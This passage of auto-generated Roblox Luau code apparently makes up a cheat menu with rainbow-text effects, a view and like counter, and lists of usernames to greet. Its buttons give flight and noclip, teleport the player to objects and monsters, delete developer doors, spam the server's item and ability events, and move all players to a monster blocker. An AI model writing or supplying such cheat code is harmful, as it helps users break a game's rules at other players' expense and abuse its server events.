		local tween = game:GetService("TweenService"):Create(TextLabel, tweenInfo, {TextColor3 = RainbowColors[Index]})
		tween:Play()
		tween.Completed:Connect(function()
			Index = Index + 1
			if Index > #RainbowColors then
				Index = 1
			end
			rainbowify()
		end)
	end
	rainbowify()
end;
task.spawn(C_109);
-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.LocalScript
local function C_10c()
	local script = G2L["10c"];
	--rainbowify the text
	local TextLabel  = script.Parent
	local IsRainbowActive =  true
	local RainbowColors = {
		Color3.fromRGB(255, 0, 0), -- Red
		Color3.fromRGB(255, 165, 0), -- Orange
		Color3.fromRGB(255, 255, 0), -- Yellow
		Color3.fromRGB(0, 255, 0), -- Green
		Color3.fromRGB(0, 0, 255), -- Blue
		Color3.fromRGB(144, 0, 255), -- Indigo
	}
	local Index = 1
	--start (WITH TWEEN)
	local function rainbowify()
		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
		local tween = game:GetService("TweenService"):Create(TextLabel, tweenInfo, {TextColor3 = RainbowColors[Index]})
		tween:Play()
		tween.Completed:Connect(function()
			Index = Index + 1
			if Index > #RainbowColors then
				Index = 1
			end
			rainbowify()
		end)
	end
	rainbowify()
end;
task.spawn(C_10c);
-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.LocalScript
local function C_113()
	local script = G2L["113"];
	repeat wait(5) until script.Parent.Parent.Parent.MainThird.Visible == true

	local TextLabel = script.Parent
	local TargetNumber = 152216
	local CurrentNumber = 0
	local SoundId = "rbxassetid://"
	local FinalMilestoneSoundId = "rbxassetid://"
	local Milestones = {5000, 10000, 20000, 50000, 100000, 150000, 152200}
	local ThisScript = script.Parent.Parent.LoL
	local shaking = false
	local colorChanging = false

	local function MakeSound(id, speed)
		local sound = Instance.new("Sound")
		sound.SoundId = id
		sound.PlaybackSpeed = speed
		sound.Parent = TextLabel
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	local isActive = true

	local function generateRandomStep()
		return math.random(100, 500)
	end

	local function ApplyPowerEffect(milestone)
		if milestone >= 150000 then
			TextLabel.TextColor3 = Color3.new(1, 0, 0)
			TextLabel.Font = Enum.Font.GothamBold
			TextLabel.TextStrokeTransparency = 0.5
			TextLabel.TextSize = 50
		elseif milestone >= 100000 then
			TextLabel.TextColor3 = Color3.new(0, 1, 0.5)
			TextLabel.TextSize = 45
		elseif milestone >= 50000 then
			TextLabel.TextColor3 = Color3.new(1, 0.5, 0)
			TextLabel.TextSize = 40
		else
			TextLabel.TextColor3 = Color3.new(0.5, 0.5, 1)
			TextLabel.TextSize = 30
		end
	end

	local function ShakeTextLabel()
		local originalPosition = TextLabel.Position
		shaking = true
		while shaking do
			local offsetX = math.random(-3, 3)
			local offsetY = math.random(-3, 3)
			TextLabel.Position = UDim2.new(originalPosition.X.Scale, originalPosition.X.Offset + offsetX, originalPosition.Y.Scale, originalPosition.Y.Offset + offsetY)
			wait(0.03)
			TextLabel.Position = originalPosition
			wait(0.03)
		end
		TextLabel.Position = originalPosition
	end

	local function ChangeColorForever()
		colorChanging = true
		while colorChanging do
			TextLabel.TextColor3 = Color3.new(1, 0, 0)
			wait(0.3)
			TextLabel.TextColor3 = Color3.new(1, 1, 1)
			wait(0.3)
		end
	end

	local function StopEffects()
		shaking = false
		colorChanging = false
	end

	local function TweenVisibility(object, isVisible)
		local goal = {}
		goal.TextTransparency = isVisible and 0 or 1
		goal.TextStrokeTransparency = isVisible and 0.5 or 1
		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = game:GetService("TweenService"):Create(object, tweenInfo, goal)
		tween:Play()
	end

	local function HandleAfterIncrement()
		isActive = false
		wait(2)
		StopEffects()

		TweenVisibility(ThisScript, false)
		wait(2)
		ThisScript.Text = "This script got liked over"
		TweenVisibility(ThisScript, true)
		wait(1)
		TextLabel.Font = Enum.Font.Montserrat

		local LikeCount = 0
		local LikeMilestones = {500, 1000, 1500, 2000, 2500, 2700}
		while LikeCount < 2719 do
			local Step = math.random(1, 15)
			LikeCount = math.min(LikeCount + Step, 2719)
			TextLabel.Text = tostring(LikeCount)

			for _, milestone in ipairs(LikeMilestones) do
				if LikeCount >= milestone and LikeCount < milestone + Step then
					local speed = 0.5 + (LikeCount / 2719) * 0.5
					MakeSound(SoundId, speed)

					if LikeCount == 2719 then
						MakeSound(FinalMilestoneSoundId, 1)
					end
				end
			end

			wait(0.05)
		end
	end

	local function IncrementNumber()
		while CurrentNumber < TargetNumber and isActive do
			local Step = generateRandomStep()
			CurrentNumber = math.min(CurrentNumber + Step, TargetNumber)
			TextLabel.Text = tostring(CurrentNumber)

			for _, milestone in ipairs(Milestones) do
				if CurrentNumber >= milestone and CurrentNumber < milestone + Step then
					local speed = 0.5 + (CurrentNumber / TargetNumber) * 0.5
					MakeSound(SoundId, speed)
					ApplyPowerEffect(milestone)

					if milestone == 152200 then
						MakeSound(FinalMilestoneSoundId, 1)
						task.spawn(ShakeTextLabel)
						task.spawn(ChangeColorForever)
						HandleAfterIncrement()
					end
				end
			end

			wait(0.01)
		end
	end

	IncrementNumber()

end;
task.spawn(C_113);
-- StarterGui.DebugVersion.Title.script_content.MainThird.TextButton.LocalScript
local function C_119()
	local script = G2L["119"];
	--Make CMDs for LocalPlayer

	local functions = {
		connect = function(a,b)
			return a:Connect(b)
		end,
	}
	local DWButton = script.Parent
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	local flying = false
	local speed = 50 -- Ajusta la velocidad según sea necesario

	local RunService = game:GetService("RunService")

	-- Función para comenzar a volar
	local function startFlying()
		flying = true
		humanoidRootPart.Anchored = false

		-- Conexión para actualizar la velocidad mientras se vuela
		RunService.RenderStepped:Connect(function()
			if flying then
				local moveDirection = humanoid.MoveDirection
				if moveDirection.Magnitude > 0 then
					local cameraDirection = workspace.CurrentCamera.CFrame.LookVector

					if humanoidRootPart.Anchored == true then
						humanoidRootPart.Anchored = false
					end

					-- Mezclar el MoveDirection con el LookVector de la cámara para mayor libertad
					local combinedDirection = (moveDirection * Vector3.new(1, 0, 1)) + Vector3.new(0, cameraDirection.Y, 0)
					combinedDirection = combinedDirection.Unit -- Normalizar la dirección
					local lookAt = humanoidRootPart.Position + Vector3.new(cameraDirection.X, 0, cameraDirection.Z)
					humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position, lookAt)
					humanoidRootPart.Velocity = combinedDirection * speed
				else
					humanoidRootPart.Anchored = true
				end
			end
		end)
	end

	-- Función para detener el vuelo
	local function stopFlying()
		flying = false
		humanoidRootPart.Anchored = false
		humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
	end

	-- Función para alternar el vuelo
	local function toggleFlight()
		if flying then
			script.Parent.Text = "Fly"
			stopFlying()
		else
			script.Parent.Text = "UNFly"
			startFlying()
		end
	end

	functions["connect"](DWButton["MouseButton1Click"], function()
		toggleFlight()
	end)

end;
task.spawn(C_119);
-- StarterGui.DebugVersion.Title.script_content.MainThird.TextButton.LocalScript
local function C_11b()
	local script = G2L["11b"];
	--Make CMDs for LocalPlayer

	local functions = {
		connect = function(a,b)
			return a:Connect(b)
		end,
	}
	local DWButton = script.Parent

	functions["connect"](DWButton["MouseButton1Click"], function()
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

		-- Función para detectar las partes que está tocando el jugador
		local function onTouched(part)
			-- Verifica si la parte es de tipo BasePart y si tiene la propiedad CanCollide activada
			if part:IsA("BasePart") and part.CanCollide then
				-- Verifica si la parte pertenece al propio jugador local
				if part:IsDescendantOf(character) then
					return -- Evita desactivar la colisión si la parte pertenece al personaje del jugador
				end

				-- Obtener la posición del jugador y de la parte
				local playerPosition = humanoidRootPart.Position
				local partPosition = part.Position

				-- Verifica si la parte está por debajo del jugador (sirve como suelo)
				if partPosition.Y < playerPosition.Y - humanoidRootPart.Size.Y / 2 then
					return -- No desactivar la colisión si es una parte de soporte
				end

				-- Desactivar la colisión de la parte tocada
				part.CanCollide = false
			end
		end

		-- Conectar la función onTouched al evento Touched del HumanoidRootPart
		humanoidRootPart.Touched:Connect(onTouched)


	end)

end;
task.spawn(C_11b);
-- StarterGui.DebugVersion.Title.script_content.MainThird.Target.LocalScript
local function C_11e()
	local script = G2L["11e"];
	--rainbowify the text
	local TextLabel  = script.Parent
	local IsRainbowActive =  true
	local RainbowColors = {
		Color3.fromRGB(255, 0, 0), -- Red
		Color3.fromRGB(255, 165, 0), -- Orange
		Color3.fromRGB(255, 255, 0), -- Yellow
		Color3.fromRGB(0, 255, 0), -- Green
		Color3.fromRGB(0, 0, 255), -- Blue
		Color3.fromRGB(144, 0, 255), -- Indigo
	}
	local Index = 1
	--start (WITH TWEEN)
	local function rainbowify()
		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
		local tween = game:GetService("TweenService"):Create(TextLabel, tweenInfo, {TextColor3 = RainbowColors[Index]})
		tween:Play()
		tween.Completed:Connect(function()
			Index = Index + 1
			if Index > #RainbowColors then
				Index = 1
			end
			rainbowify()
		end)
	end
	rainbowify()
end;
task.spawn(C_11e);
-- StarterGui.DebugVersion.Title.script_content.MainThird.Aut.LocalScript
local function C_121()
	local script = G2L["121"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.MainFour.Visible = true
		script.Parent.Parent.Parent.MainThird.Visible = false
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.MainTwo.Visible = false
	end)
end;
task.spawn(C_121);
-- StarterGui.DebugVersion.Title.script_content.greetings.NAMES.NamesScripter
local function C_125()
	local script = G2L["125"];
	local Frame = script.Parent -- Frame que contiene el UIListLayout y donde se clonan los TextLabels
	local Template = script.TextLabelTemplate -- El TextLabel base para clonar (inicialmente invisible)

	-- Lista de usuarios con sus niveles
	local users = {
		{name = "@chinzhien", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@miss_circle8030", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@dimacnhik2014", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@Chun_2736", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@Jirehstania", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@Pretty_omy", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@Angel_D6st", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@levij_66", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@khalisa_j", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@Un_Real674", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@MC_Liit1", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@BendyBoi62827", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@idpepp", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@Jhaden_PlayzRoblox1", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@Borjenio", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@SweetSeizureO_X", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@vivinn33", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@To09ztoo_9110", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@any1comeh", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@Fufmfhchccucjc", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@Polhna2020", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@BunnyRebeccaOfficial", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@idrinkichor", level = 1}, -- Nivel 1 (Seguidores)
		{name = "@Lol725282262627", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@Tommih_Todi", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@zoethebubugirl", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@danniel_rd5", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@LenaaHaaa", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@PinkxKitty17", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@soyyoelm2", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@UPDATE_EMERSON", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@zmh2016", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@Hiram09281", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@K4therine1540", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@HEKTO_19753", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@audreyadawiyah", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@Cayson9282747483948", level = 2}, -- Nivel 2 (Seguidores + Amigos)
		{name = "@ANormalKidCant_DoTho", level = 3},  -- Nivel 3 (Seguidores + Amigos geniales )
		{name = "@AmaziingKittyy", level = 3}
	}
	print(#users.." in a frame")

	-- Ordenar los usuarios por nivel de poder (Nivel 1 primero, Nivel 3 al final)
	table.sort(users, function(a, b)
		return a.level < b.level
	end)

	-- Función para clonar y personalizar el TextLabel
	local function createTextLabel(user)
		-- Clonar el TextLabel
		local Clone = Template:Clone()
		Clone.Name = user.name
		Clone.Text =  user.name
		Clone.Parent = Frame
		Clone.Visible = true -- Asegúrate de que el clon sea visible

		-- Ajustar el estilo según el nivel de poder
		if user.level == 1 then
			-- Nivel 1: Color negro (básico)
			Clone.TextColor3 = Color3.fromRGB(255, 255, 255)
			Clone.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
			Clone.TextStrokeTransparency = 0.8 -- Stroke tenue
		elseif user.level == 2 then
			-- Nivel 2: Cambiar color a verde
			Clone.TextColor3 = Color3.fromRGB(0, 255, 0)
			Clone.TextStrokeTransparency = 0.5 -- Stroke más visible
		elseif user.level == 3 then
			-- Nivel 3: Cambiar color a azul y stroke más visible
			Clone.TextColor3 = Color3.fromRGB(0, 0, 255)
			Clone.TextStrokeTransparency = 0 -- Stroke completamente visible
		end
	end

	-- Crear los TextLabels para todos los usuarios
	for _, user in ipairs(users) do
		createTextLabel(user)
	end

end;
task.spawn(C_125);
-- StarterGui.DebugVersion.Title.script_content.greetings.GreetingButton.LocalScript
local function C_128()
	local script = G2L["128"];
	local TweenService = game:GetService("TweenService")
	local TextLabel = script.Parent -- Asegúrate de que este script esté dentro del TextLabel

	-- Configuración del movimiento
	local moveDistance = 20 -- Distancia en píxeles hacia arriba/abajo
	local moveTime = 1.5 -- Duración de cada movimiento (segundos)

	-- Crear una función para animar el movimiento
	local function createTween(goalPosition)
		return TweenService:Create(
			TextLabel, 
			TweenInfo.new(moveTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), 
			{Position = goalPosition}
		)
	end

	-- Función para hacer que el TextLabel se mueva hacia arriba y abajo suavemente
	local function moveUpAndDown()
		local originalPosition = TextLabel.Position
		local upGoal = originalPosition - UDim2.new(0, 0, 0, moveDistance)

		-- Crear el tween para mover hacia arriba y hacia abajo de manera continua
		local moveTween = createTween(upGoal)

		-- Reproducir el tween para animación continua
		moveTween:Play()
	end

	-- Iniciar la animación
	moveUpAndDown()

end;
task.spawn(C_128);
-- StarterGui.DebugVersion.Title.script_content.greetings.GreetingButton.LocalScript
local function C_129()
	local script = G2L["129"];
	local TextLabel = script.Parent -- Asegúrate de que este script esté dentro del TextLabel

	-- Texto inicial del TextLabel
	local text = "Greetings To"
	TextLabel.Text = text
	TextLabel.RichText = true -- Activar RichText para estilos avanzados

	-- Configuración del efecto arcoíris
	local rainbowSpeed = 7 -- Velocidad de cambio de color
	local totalHueShift = 360 -- Rango completo de colores en el espectro (grados HSV)

	-- Función para convertir HSV a Color3
	local function HSVToColor3(h, s, v)
		local c = v * s
		local x = c * (1 - math.abs((h / 60) % 2 - 1))
		local m = v - c

		local r, g, b
		if h < 60 then
			r, g, b = c, x, 0
		elseif h < 120 then
			r, g, b = x, c, 0
		elseif h < 180 then
			r, g, b = 0, c, x
		elseif h < 240 then
			r, g, b = 0, x, c
		elseif h < 300 then
			r, g, b = x, 0, c
		else
			r, g, b = c, 0, x
		end
		return Color3.new(r + m, g + m, b + m)
	end

	-- Función para construir el texto con colores arcoíris
	local function getRainbowText(timeOffset)
		local coloredText = ""
		for i = 1, #text do
			local letter = text:sub(i, i)
			local hue = (timeOffset + (i / #text) * totalHueShift) % 360
			local color = HSVToColor3(hue, 1, 1) -- Saturación y valor máximos para colores brillantes
			coloredText = coloredText .. string.format(
				'<font color="rgb(%d, %d, %d)">%s</font>',
				math.floor(color.R * 255),
				math.floor(color.G * 255),
				math.floor(color.B * 255),
				letter
			)
		end
		return coloredText
	end

	-- Bucle para animar los colores arcoíris
	local timeElapsed = 0
	while true do
		timeElapsed = timeElapsed + rainbowSpeed
		TextLabel.Text = getRainbowText(timeElapsed)
		task.wait(0.1) -- Cambiar colores cada 0.1 segundos
	end

end;
task.spawn(C_129);
-- StarterGui.DebugVersion.Title.script_content.greetings.GreetingButton.LocalScript
local function C_12a()
	local script = G2L["12a"];
	--make a hover effect for script.parent button
	local button = script.Parent

	button.MouseEnter:Connect(function()
		--change Button TextStrokeColor3 to (255, 255, 255) Using TweenService.
		local tweenService = game:GetService("TweenService")
		local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
		local goal = {}
		goal.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
		local tween = tweenService:Create(button, tweenInfo, goal)
		tween:Play()
	end)

	button.MouseLeave:Connect(function()
		--change Button TextStrokeColor3 to (0, 0, 0) Using TweenService.
		local tweenService = game:GetService("TweenService")
		local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
		local goal = {}
		goal.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
		local tween = tweenService:Create(button, tweenInfo, goal)
		tween:Play()
	end)
end;
task.spawn(C_12a);
-- StarterGui.DebugVersion.Title.script_content.greetings.GreetingButton.LocalScript
local function C_12b()
	local script = G2L["12b"];
	local NowIsIn = 1 --only one or two
	script.Parent.MouseButton1Click:Connect(function()
		--change NowIsIn to 1 or 2, if its in 2, then change it to 1, else change it to 2
		NowIsIn = NowIsIn == 1 and 2 or 1
		if NowIsIn == 1 then
			script.Parent.Parent.NAMES.Visible = true
			script.Parent.Parent.NAMES2.Visible = false
		elseif NowIsIn == 2  then
			script.Parent.Parent.NAMES.Visible = false
			script.Parent.Parent.NAMES2.Visible = true
		end
	end)
end;
task.spawn(C_12b);
-- StarterGui.DebugVersion.Title.script_content.greetings.NAMES2.Names2Scripter
local function C_12e()
	local script = G2L["12e"];
	local Frame = script.Parent -- Frame que contiene el UIListLayout y donde se clonan los TextLabels
	local Template = script.TextLabelTemplate -- El TextLabel base para clonar (inicialmente invisible)

	-- Lista de usuarios con sus niveles
	local users = {
		{name = "@aMeow_tyu2", level = 1},
		{name = "@1_L3MM1", level = 1},
		{name = "@Whe_389", level = 1},
		{name = "@Aubrey_60884", level = 1},
		{name = "@peachlover1455", level = 1},
		{name = "@rosamario21", level = 1},
		{name = "@Brahw76", level = 1},
		{name = "@fabiankiczka", level = 1},
		{name = "@UchikenaWNM", level = 1},
		{name = "@MM2_bela5", level = 1},
		{name = "@strawberry_33211", level = 1},
		{name = "@conmethuy3865", level = 1},
		{name = "@Tweekdrinks", level = 1},
		{name = "@alansbestieforever", level = 1},
		{name = "@ARHaeu", level = 1},
		{name = "@ObsessedlilS1mp", level = 1},
		{name = "@Sunnybunny_onPC90", level = 1},
		{name = "@GodBoxten_123", level = 1},
		{name = "@sisters_2012hi", level = 1},
		{name = "@sarahy9000sarahy090", level = 1},
		{name = "@ram20202020", level = 1},
		{name = "@Ruvyzat_4N4", level = 1},
		{name = "@Joood_2468", level = 1},
		{name = "@kazuopii", level = 2}, 
		{name = "@ykrabmat", level = 2}, 
		{name = "@Pocw103", level = 2}, 
		{name = "@LOVEme10A", level = 2}, 
		{name = "@olas_0266", level = 2}, 
		{name = "@kenrickjosh14", level = 2}, 
		{name = "@SoyUnMegaPro9898", level = 2}, 
		{name = "@radioisaacrabbit", level = 2}, 
		{name = "@pebble2470", level = 2}, 
		{name = "@Ysbhsbhsbhsbhbsh", level = 3},
		{name = "@JayJo92", level = 3},
		{name = "@ROBLOXGAMING1O1920", level = 3},
	}
	print(#users.." in a frame")

	-- Ordenar los usuarios por nivel de poder (Nivel 1 primero, Nivel 3 al final)
	table.sort(users, function(a, b)
		return a.level < b.level
	end)

	-- Función para clonar y personalizar el TextLabel
	local function createTextLabel(user)
		-- Clonar el TextLabel
		local Clone = Template:Clone()
		Clone.Name = user.name
		Clone.Text =  user.name
		Clone.Parent = Frame
		Clone.Visible = true -- Asegúrate de que el clon sea visible

		-- Ajustar el estilo según el nivel de poder
		if user.level == 1 then
			-- Nivel 1: Color negro (básico)
			Clone.TextColor3 = Color3.fromRGB(255, 255, 255)
			Clone.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
			Clone.TextStrokeTransparency = 0.8 -- Stroke tenue
		elseif user.level == 2 then
			-- Nivel 2: Cambiar color a verde
			Clone.TextColor3 = Color3.fromRGB(0, 255, 0)
			Clone.TextStrokeTransparency = 0.5 -- Stroke más visible
		elseif user.level == 3 then
			-- Nivel 3: Cambiar color a azul y stroke más visible
			Clone.TextColor3 = Color3.fromRGB(0, 0, 255)
			Clone.TextStrokeTransparency = 0 -- Stroke completamente visible
		end
	end

	-- Crear los TextLabels para todos los usuarios
	for _, user in ipairs(users) do
		createTextLabel(user)
	end

end;
task.spawn(C_12e);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_133()
	local script = G2L["133"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()


		local QueVaLoko = "RevealRoom" 
		local targetMeshPartName = "CurtainL"  

		local folder = game.Workspace:FindFirstChild(QueVaLoko)

		if folder then
			-- Buscar la MeshPart en la carpeta
			local curtainMeshPart = folder:FindFirstChild(targetMeshPartName)

			if curtainMeshPart and curtainMeshPart:IsA("MeshPart") then
				-- Teletransportar al jugador a la MeshPart
				character:SetPrimaryPartCFrame(curtainMeshPart.CFrame)
				print("Jugador teletransportado a CurtainL.")
			else
				warn("MeshPart 'CurtainL' no encontrada en la carpeta.")
			end
		else
			warn("vro")
		end

	end)
end;
task.spawn(C_133);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_138()
	local script = G2L["138"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		-- Nombre del modelo a buscar
		local modelName = "Bed"  -- Cambia esto si necesitas otro nombre
		local targetMeshPartName = "JackInTheBox"  -- Nombre de la MeshPart a buscar

		-- Buscar el modelo en Workspace
		local bedModel = game.Workspace:FindFirstChild(modelName)

		if bedModel and bedModel:IsA("Model") then
			-- Buscar la MeshPart dentro del modelo
			local jackInTheBox = bedModel:FindFirstChild(targetMeshPartName)

			if jackInTheBox and jackInTheBox:IsA("MeshPart") then
				-- Teletransportar al jugador a la MeshPart
				character:SetPrimaryPartCFrame(jackInTheBox.CFrame)
				print("Jugador teletransportado a JackInTheBox.")
			else
				warn("MeshPart 'JackInTheBox' no encontrada en el modelo 'Bed'.")
			end
		else
			warn("Modelo 'Bed' no encontrado en Workspace.")
		end

	end)
end;
task.spawn(C_138);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_13d()
	local script = G2L["13d"];
	script.Parent.MouseButton1Click:Connect(function()
		workspace.DevDoor:Destroy()
		wait(1)
		workspace.DevDoor2:Destroy()
	end)
end;
task.spawn(C_13d);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_140()
	local script = G2L["140"];
	script.Parent.MouseButton1Click:Connect(function()
		local currentRoom = workspace:FindFirstChild("CurrentRoom")
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		if currentRoom then
			for _, item in pairs(currentRoom:GetChildren()) do
				if item:IsA("Model") then
					local generatorsFolder = item:FindFirstChild("Generators")

					if generatorsFolder then
						local generators = {}

						for _, generator in pairs(generatorsFolder:GetChildren()) do
							if generator:IsA("Model") then
								table.insert(generators, generator)
							end
						end

						if #generators > 0 then
							local randomGenerator = generators[math.random(1, #generators)]
							character:SetPrimaryPartCFrame(randomGenerator:GetModelCFrame())
						end
					end
				end
			end
		end

	end)
end;
task.spawn(C_140);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_143()
	local script = G2L["143"];
	script.Parent.MouseButton1Click:Connect(function()
		local currentRoomFolder = game.Workspace:FindFirstChild("CurrentRoom")
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local isTeleportingToMonsters = false

		-- Función para teletransportar al jugador sobre los monstruos
		local function teleportToMonsters(monstersFolder)
			if monstersFolder then
				for _, monster in pairs(monstersFolder:GetChildren()) do
					if monster:IsA("Model") and monster.PrimaryPart then
						local abovePosition = monster.PrimaryPart.Position + Vector3.new(0, 20, 0)  -- Teletransportar 20 unidades más arriba del monstruo
						character:SetPrimaryPartCFrame(CFrame.new(abovePosition))  -- Teletransportar al jugador
						wait(0.5)  -- Pequeño retraso entre teletransportes
					end
				end
				isTeleportingToMonsters = false  -- Termina la teletransportación
			end
		end

		-- Función para buscar la carpeta Monsters y teletransportar al jugador
		local function searchForMonstersAndTeleport()
			if currentRoomFolder then
				for _, room in pairs(currentRoomFolder:GetChildren()) do
					if room:IsA("Model") then
						local monstersFolder = room:FindFirstChild("Monsters")
						if monstersFolder then
							isTeleportingToMonsters = true  -- Empieza la teletransportación
							teleportToMonsters(monstersFolder)  -- Teletransportar al jugador sobre los monstruos
							break
						end
					end
				end
			end
		end

		-- Función principal para activar el teletransporte
		local function startTeleportingToMonsters()
			searchForMonstersAndTeleport()
		end

		-- Llamar la función para iniciar el teletransporte
		startTeleportingToMonsters()
	end)
end;
task.spawn(C_143);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_146()
	local script = G2L["146"];
	script.Parent.MouseButton1Click:Connect(function()
		local workspace = game:GetService("Workspace")
		local players = game:GetService("Players")

		-- Busca la carpeta Info en Workspace
		local infoFolder = workspace:FindFirstChild("Info")

		-- Verifica si la carpeta Info existe
		if infoFolder then
			-- Busca el BoolValue llamado Panic
			local panicBool = infoFolder:FindFirstChild("Panic")

			-- Verifica si Panic existe y es de tipo BoolValue
			if panicBool and panicBool:IsA("BoolValue") then
				-- Crea un bucle que se repita cada 0.5 segundos
				while true do
					-- Si Panic está activado
					if panicBool.Value == true then
						-- Busca la carpeta Elevators en Workspace
						local elevatorsFolder = workspace:FindFirstChild("Elevators")

						-- Verifica si la carpeta Elevators existe
						if elevatorsFolder then
							-- Busca un modelo dentro de Elevators
							local elevatorModel = elevatorsFolder:FindFirstChildWhichIsA("Model")

							-- Verifica si hay un modelo
							if elevatorModel then
								-- Busca una parte llamada MonsterBlocker dentro del modelo
								local monsterBlocker = elevatorModel:FindFirstChild("MonsterBlocker")

								-- Verifica si MonsterBlocker existe
								if monsterBlocker and monsterBlocker:IsA("Part") then
									-- Teletransporta a todos los jugadores al MonsterBlocker
									for _, player in pairs(players:GetPlayers()) do
										local character = player.Character
										if character and character:FindFirstChild("HumanoidRootPart") then
											-- Teletransporta al jugador al MonsterBlocker
											character.HumanoidRootPart.CFrame = monsterBlocker.CFrame
										end
									end
								end
							end
						end
					end

					-- Espera 0.5 segundos antes de la próxima iteración
					wait(0.5)
				end
			end
		end
	end)
end;
task.spawn(C_146);
-- StarterGui.DebugVersion.Title.script_content.MainFive.Aut.LocalScript
local function C_149()
	local script = G2L["149"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.MainTwo.Visible = false
		script.Parent.Parent.Parent.MainThird.Visible = false
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = true
		script.Parent.Parent.Parent.MainFive.Visible = false
	end)
end;
task.spawn(C_149);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_14c()
	local script = G2L["14c"];
	local LoopActiveItems = false
	script.Parent.MouseButton1Click:Connect(function()
		LoopActiveItems = not LoopActiveItems
		if LoopActiveItems then
			local function invokeItemEvent(slot)
				local args = {
					[1] = game.Players.LocalPlayer.Character,
					[2] = game.Players.LocalPlayer.Character.Inventory:FindFirstChild(slot)
				}

				if args[2] then
					game.ReplicatedStorage.Events.ItemEvent:InvokeServer(unpack(args))
				end
			end


			local function autoInvokeItems()
				while LoopActiveItems do
					invokeItemEvent("Slot1")
					invokeItemEvent("Slot2")
					invokeItemEvent("Slot3")
					wait(1)
				end
			end

		end
	end)
end;
task.spawn(C_14c);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_14f()
	local script = G2L["14f"];
	script.Parent.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.NameTag.Frame.GroupRank.Visible = true
	end)
end;
task.spawn(C_14f);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_152()
	local script = G2L["152"];
	local activedasdasd = false
	script.Parent.MouseButton1Click:Connect(function()
		activedasdasd = not activedasdasd
		-- Función para ejecutar el evento AbilityEvent
		local function invokeAbilityEvent()
			local args = {
				[1] = game:GetService("Players").LocalPlayer.Character,
